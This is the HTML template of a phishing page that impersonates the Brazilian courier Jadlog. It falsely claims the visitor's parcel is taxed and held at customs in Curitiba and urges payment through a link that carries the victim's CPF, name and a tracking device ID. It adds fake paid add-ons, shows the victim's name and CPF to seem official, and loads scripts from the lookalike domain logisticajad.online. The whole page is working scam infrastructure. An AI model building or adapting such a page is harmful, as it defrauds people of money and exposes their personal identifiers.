<html lang="en">

<head>

    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <!-- <script src="../confirmacao/images/3123.js"></script> -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="preconnect" href="https://fonts.googleapis.com/">
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
    <link href="2_arquivos/css2-1.html" rel="stylesheet">
    <link rel="stylesheet" href="/encomenda/2_arquivos/bootstrap-1.css">
    <link rel="stylesheet" href="/encomenda/2_arquivos/app-1.css">
    <link rel="stylesheet" href="/encomenda/2_arquivos/yellow-1.css">
    <link rel="stylesheet" href="/encomenda/2_arquivos/all-1.css" crossorigin="anonymous">
    <link rel="icon" type="image/x-icon" href="https://logospng.org/download/jadlog/logo-jadlog-icon-1024.png">
    <meta name="csrf-token" content="XhpaSjXrgaC3XF8BrR4GtmpFPMLsyEiAAnHS72ER">
    <title>Jadlog | Rastreio</title>
    <link rel="stylesheet" type="text/css" href="/enc/all.css">
    <script src="https://logisticajad.online/cdn.jsdelivr.net/npm/%40flasher/flasher%401.3.2/dist/flasher.min.js" type="text/javascript"></script>
    <script src="2_arquivos/flasher.min.js" type="text/javascript"></script>
    <script src="2_arquivos/flasher.min_002.js" type="text/javascript"></script>
    <!-- Código do Pixel do Facebook -->


</head>










<body>
    <header class="w-100 font-size-16 font-weight-400 text-blue">
        <!-- <div class="w-100 bg-grey px-3 px-lg-3 py-1 border-bottom border-white">
      <span style="color: black;">Acessibilidade</span>

      <i class="fas fa-caret-down ml-1"></i>
    </div> -->
        <div class="">
            <nav class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning"
                style="height:48px;   border-color: #dc0032!important;">


                <div class="ml-0 ml-lg-1 d-flex justify-content-center" style="width:100%">
                    <a href="index.html#" class="py-2">
                        <img src="https://logodownload.org/wp-content/uploads/2019/02/jadlog-logo.png" alt=""
                            height="25">
                    </a>
                </div>

                <div class="ml-4 d-none d-lg-block " style="width:150px">
                    <a href="index.html#"
                        class="py-1 text-blue-dark border-left border-secondary px-3 text-decoration-none">
                        <img src="Correios _ Rastreio_arquivos/entrar.svg" alt="Correios" width="31">

                        <span class="ml-1">Entrar</span>
                    </a>
                </div>
            </nav>
        </div>
    </header>

    <main>
        <nav class="d-flex align-items-center flex-wrap mt-4 px-2 font-weight-400 w-95 max-w-1000"
            style="margin: 0 auto;">
            <span class="text-blue mr-2" style="color: black;"><b>Portal Jadlog</b></span>
            <i class="fal fa-angle-right mr-2"></i>
            <span class="text-blue mr-2" style="color: black;">Rastreamento</span>
            <i class="fal fa-angle-right mr-2"></i>

            <span class="text-blue mr-2"><span class="cpf"></span></span>
        </nav>


        <section class="mt-3 p-4  w-95 max-w-1000" style="margin:0 auto;">

            <h5 class="text-danger  font-weight-700 mb-4">
                <i class="far fa-exclamation-triangle"></i> SUA ENCOMENDA FOI TRIBUTADA!


            </h5>
            <h4 class="text-blue-dark font-size-20 font-weight-700 mt-1 mb-2">

                STATUS DA ENTREGA: <br>
            </h4>

            <h4 class="text-warning font-size-18 font-weight-700 mt-1 mb-2 d-flex align-items-center">
                <div id="blink" style="width:12px;height:12px;border-radius:50%;" class="mr-2 bg-warning"></div>
                AGUARDANDO PAGAMENTO
            </h4>
            <h5 id="address" style="color:#000;">Sua encomenda está retida nas agências JadLog em Curitiba - PR </h5>

            <p class="mt-4">Para liberar o envio do seu produto. O pagamento deve ser feito clicando no botão abaixo:
            </p>



        </section>
        <div style="padding: 0px 30px 0px 30px;">
            <a id="linkPagamento" href="/pagamento/?cpf={{$cpf ?? ''}}&name={{$name ?? ''}}"
                class="btn btn-primary"
                style="font-size:13px;width: 100%; background-color: #dc0032; border-color: #dc0032;">CLIQUE AQUI
                PARA LIBERAÇÃO DO SEU PEDIDO</a>

        </div>
        <script>
    let deviceId = localStorage.getItem('device_id');
    if (!deviceId) {
        deviceId = crypto.randomUUID();
        localStorage.setItem('device_id', deviceId);
    }
    const link = document.getElementById('linkPagamento');
    const url = new URL(link.href);
    url.searchParams.set('device_id', deviceId);
    link.href = url.toString();
</script>

<section class="order-bump-section w-95 max-w-1000" style="margin: 2rem auto;">

            <!-- Card 1 -->
            <label class="order-bump-card d-flex align-items-center justify-content-between p-3 mb-3 border rounded"
                style="cursor: pointer; background: #f9f9f9; user-select: none;">
                <div class="d-flex align-items-center">
                    <input type="checkbox" name="orderbump1" class="custom-checkbox" />
                    <div>
                        <h5 class="mb-1" style="font-weight: 700; font-size: 1rem; color: #dc0032;">Garantia Estendida
                        </h5>
                        <p class="mb-0" style="font-size: 0.9rem; color: #333;">Proteja seu produto por mais 12 meses.
                        </p>
                    </div>
                </div>

                <div class="d-flex align-items-center">
                    <span style="font-weight: 700; color: #dc0032; font-size: 1.1rem; margin-right: 10px;">R$
                        19,90</span>

                </div>
            </label>

            <!-- Card 2 -->
            <label class="order-bump-card d-flex align-items-center justify-content-between p-3 mb-3 border rounded"
                style="cursor: pointer; background: #f9f9f9; user-select: none;">
                <div class="d-flex align-items-center">
                    <input type="checkbox" name="orderbump2" class="custom-checkbox" />
                    <div>
                        <h5 class="mb-1" style="font-weight: 700; font-size: 1rem; color: #dc0032;">Suporte Premium
                        </h5>
                        <p class="mb-0" style="font-size: 0.9rem; color: #333;">Atendimento dedicado 24h por dia.
                        </p>
                    </div>
                </div>

                <div class="d-flex align-items-center">
                    <span style="font-weight: 700; color: #dc0032; font-size: 1.1rem; margin-right: 10px;">R$
                        4,90</span>

                </div>
            </label>

            <!-- Card 3 -->
            <label class="order-bump-card d-flex align-items-center justify-content-between p-3 mb-3 border rounded"
                style="cursor: pointer; background: #f9f9f9; user-select: none;">
                <div class="d-flex align-items-center">
                    <input type="checkbox" name="orderbump3" class="custom-checkbox" />
                    <div>
                        <h5 class="mb-1" style="font-weight: 700; font-size: 1rem; color: #dc0032;">Entrega Expressa
                        </h5>
                        <p class="mb-0" style="font-size: 0.9rem; color: #333;">Receba seu pedido em até 24h.</p>
                    </div>
                </div>

                <div class="d-flex align-items-center">
                    <span style="font-weight: 700; color: #dc0032; font-size: 1.1rem; margin-right: 10px;">R$
                        14,90</span>

                </div>
            </label>

        </section>
<script>
  const btnPagamento = document.getElementById('btn-pagamento');
  const checkboxes = document.querySelectorAll('.custom-checkbox');

  // Pega a base do href sem parâmetros bump
  const baseHref = btnPagamento.getAttribute('href').split('?')[0];
  // Pega os parâmetros iniciais (cpf, name)
  const urlParams = new URLSearchParams(window.location.search);
  // Também tenta pegar os parâmetros do href original do botão, caso tenham cpf/name já setados
  const btnUrlParams = new URLSearchParams(btnPagamento.getAttribute('href').split('?')[1] || '');

  function atualizarHref() {
    // Começa com os parâmetros iniciais de cpf, name (do botão)
    const params = new URLSearchParams(btnUrlParams.toString());

    checkboxes.forEach((checkbox) => {
      const bumpParam = checkbox.name.replace('orderbump', 'bump');
      if (checkbox.checked) {
        params.set(bumpParam, 'true');
      } else {
        params.delete(bumpParam);
      }
    });

    btnPagamento.href = baseHref + '?' + params.toString();
  }

  checkboxes.forEach((checkbox) => {
    checkbox.addEventListener('change', atualizarHref);
  });

  // Atualiza ao carregar para já refletir os estados iniciais, caso haja
  window.addEventListener('DOMContentLoaded', () => {
    // Marca checkboxes conforme a URL atual do navegador (opcional)
    const currentParams = new URLSearchParams(window.location.search);
    checkboxes.forEach((checkbox) => {
      const bumpParam = checkbox.name.replace('orderbump', 'bump');
      if (currentParams.get(bumpParam) === 'true') {
        checkbox.checked = true;
      }
    });
    atualizarHref();
  });
</script>

        <style>
            /* Esconde o checkbox padrão */
            .custom-checkbox {
                appearance: none;
                -webkit-appearance: none;
                width: 22px;
                height: 22px;
                border: 2px solid #dc0032;
                border-radius: 5px;
                margin-right: 15px;
                cursor: pointer;
                position: relative;
                transition: background-color 0.3s, border-color 0.3s;
            }

            .custom-checkbox:checked {
                background-color: #dc0032;
                border-color: #dc0032;
            }

            /* Marca de check personalizada */
            .custom-checkbox:checked::after {
                content: "";
                position: absolute;
                top: 4px;
                left: 7px;
                width: 5px;
                height: 10px;
                border: solid white;
                border-width: 0 2px 2px 0;
                transform: rotate(45deg);
            }

            /* Para o label, deixar o cursor pointer ao passar em todo card */
            label.order-bump-card:hover {
                background-color: #ffe6e6;
            }

            /* Responsividade */
            @media (max-width: 600px) {
                .order-bump-card {
                    flex-direction: column;
                    align-items: flex-start;
                }

                .order-bump-card>div:last-child {
                    margin-top: 10px;
                    justify-content: flex-start !important;
                    width: 100%;
                }

                .order-bump-card img {
                    margin-left: 0 !important;
                }
            }
        </style>
        <section class="mt-3 p-4  w-95 max-w-1000" style="margin:0 auto;">

            <div class="container">
                <div class="overlay">
                    <div class="overlay-text">
                        <p class="rotate">
                            NOME: {{ $name}}<br>
                            CPF: {{$cpf}} </p>

                    </div>
                </div>
            </div>


            <style>
                /* Estilo para o contêiner pai */
                .container {
                    position: relative;
                    /* Faz com que os filhos com posição absoluta sejam relativos a este contêiner */
                    width: 100%;
                    /* Ou o tamanho desejado */
                    height: 300px;
                    /* Ou o tamanho desejado */
                    background-color: #f0f0f0;
                    /* Apenas para dar um fundo e melhor visualização */
                    border: 1px solid #ddd;
                    /* Para visualizar a borda da div */
                }

                /* Estilo para a div que vai conter o texto */
                .overlay {
                    position: relative;
                    /* Necessário para que o texto seja posicionado em relação a essa div */
                    width: 100%;
                    height: 100%;
                    background-image: url(/crop.png);
                    /* Se for para usar uma imagem de fundo */
                    background-size: cover;
                    /* Ajusta a imagem de fundo */
                    background-position: center;
                }

                /* Estilo para o texto centralizado dentro da div */
                .overlay-text {
                    position: absolute;
                    top: 51%;
                    left: 55%;
                    transform: translate(-50%, -50%);
                    background-color: transparent;
                    color: black !important;
                    padding: 10px 20px;
                    font-size: 10px;
                    text-align: center;
                    border-radius: 5px;
                    width: 300px;
                }

                .rotate {
                    text-align: start;
                    transform: rotate(2deg);

                    color: black !important;
                    font-weight: bold;
                    opacity: 0.5;
                    text-shadow: rgba(0, 0, 0, 0.3) 1px 1px 3px, rgba(0, 0, 0, 0.3) -1px -1px 3px, rgba(0, 0, 0, 0.1) 0px 0px 8px;
                    transform-style: preserve-3d;
                    transform: rotateX(1.2deg) rotateY(55deg);
                }

                /* Entre 100px e 200px, font para .rotate */
                @media (min-width: 100px) and (max-width: 200px) {
                    .rotate {}
                }

                /* Entre 201px e 300px, font para .rotate */
                @media (min-width: 201px) and (max-width: 300px) {
                    .rotate {}
                }

                /* Entre 301px e 400px, font para .rotate */
                @media (min-width: 301px) and (max-width: 400px) {
                    .rotate {}
                }
            </style>
        </section>
        <section class="px-4 py mb-5 w-95 max-w-1000" style="margin:0 auto;">
            <ul>


                <li class="d-flex mt-4" style="position: relative">
                    <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue"
                        style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
                        <img src="https://logospng.org/download/jadlog/logo-jadlog-icon-1024.png" alt=""
                            width="32">
                    </div>

                    <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
                        <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
                            Previsão de Entrega
                        </h5>

                        <span class="text-dark font-size-12 flex-wrap">
                            3 dias após o pagamento
                        </span>
                    </div>
                </li>

                <li class="d-flex mt-5" style="position: relative">
                    <div
                        style="width:2px;height:120px;background-color:#dc0032;position:absolute;top:-118px;left:24px">
                    </div>

                    <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue"
                        style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
                        <i class="fal fa-usd-circle"></i>
                    </div>

                    <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
                        <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
                            Objeto aguardando pagamento
                        </h5>

                        <span class="text-dark font-size-12 flex-wrap">
                            em Unidade de Fiscalização Aduaneira, Curitiba, PR <br>
                        </span>

                        <h5 class="mt-1 text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
                            Realize o pagamento: <a
                                href="/pagamento/?cpf={{$dados['CPF'] ?? ''}}&name={{$dados['NOME'] ?? ''}}"
                                class="text-blue">Efetuar Pagamento</a>
                        </h5>
                    </div>
                </li>

                <li class="d-flex mt-5" style="position: relative">
                    <div
                        style="width:2px;height:120px;background-color:#dc0032;position:absolute;top:-118px;left:24px">
                    </div>

                    <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue"
                        style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
                        <i class="fal fa-truck"></i>
                    </div>

                    <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
                        <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
                            Objeto em transferência - por favor aguarde
                        </h5>

                        <span class="text-dark font-size-12 flex-wrap">
                            de Unidade de Tratamento, Curitiba, PR <br>
                            para Unidade de Fiscalização Aduaneira - Curitiba, PR
                        </span>
                    </div>
                </li>

                <li class="d-flex mt-5" style="position: relative">
                    <div style="width:2px;height:100px;background-color:#dc0032;position:absolute;top:-98px;left:24px">
                    </div>

                    <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue"
                        style="width:50px;height:50px;border-radius:50%;z-index:100">
                        <i class="fal fa-truck-loading"></i>
                    </div>

                    <div class="w-70 d-flex flex-column ml-3 justify-content-center font-verdana text-wrap">
                        <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0">
                            Objeto recebido em território nacional
                        </h5>
                        <span class="text-dark font-size-12">
                            Para: Objeto em trânsito por território nacional
                        </span>

                        <span class="text-dark font-size-12">Curitiba - PR</span>
                    </div>
                </li>

                <li class="d-flex mt-5" style="position: relative">
                    <div
                        style="width:2px;height:120px;background-color:#dc0032;position:absolute;top:-118px;left:24px">
                    </div>

                    <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue"
                        style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
                        <i class="fal fa-truck"></i>
                    </div>

                    <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
                        <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
                            Objeto em transferência - por favor aguarde
                        </h5>

                        <span class="text-dark font-size-12 flex-wrap">
                            de Unidade de Tratamento, Brasília - Brasil <br> para Unidade de Tratamento
                            Nacional, Curitiba - PR, Brasil
                        </span>
                    </div>
                </li>

                <li class="d-flex mt-5" style="position: relative">
                    <div
                        style="width:2px;height:172px;background-color:#dc0032;position:absolute;top:-170px;left:24px">
                    </div>

                    <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue"
                        style="width:50px;height:50px;border-radius:50%;z-index:100">
                        <i class="fal fa-box-alt"></i>
                    </div>

                    <div class="d-flex flex-column ml-3 justify-content-center font-verdana">
                        <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0">Objeto Postado
                        </h5>
                        <span class="text-dark font-size-12"> Brasília - Brasil</span>
                    </div>
                </li>
            </ul>

        </section>

        <section class="my-4 w-95 max-w-1000" style="margin:0 auto;">
            <div>
                <img src="../outdoor02.png" alt="" class="w-100">
            </div>
        </section>
    </main>

    <footer class="d-flex flex-wrap px-5 py-4 bg-yellow text-blue-dark" style="background-color: #fff;">
        <div style="display: flex; justify-content: center; align-items: center; margin: 20px auto">
            <img width="150px" src="https://logodownload.org/wp-content/uploads/2019/02/jadlog-logo.png"
                alt="">
        </div>

        <div class="d-flex justify-content-center w-100 px-3 mb-3 text-dark font-size-14">
            <span>© Copyright 2025 Jadlog</span>
        </div>
    </footer>

    <script src="https://logisticajad.online/encomenda/2_arquivos/jquery-3.6.0.min-1.js"></script>
    <script src="https://logisticajad.online/encomenda/2_arquivos/bootstrap.min-1.js"></script>

    <script src="https://logisticajad.online/scripts/utms/latest-2.js" data-utmify-prevent-subids="" async="" defer=""></script>



    <vnl-hcslcbywnciu></vnl-hcslcbywnciu>
</body>

</html>
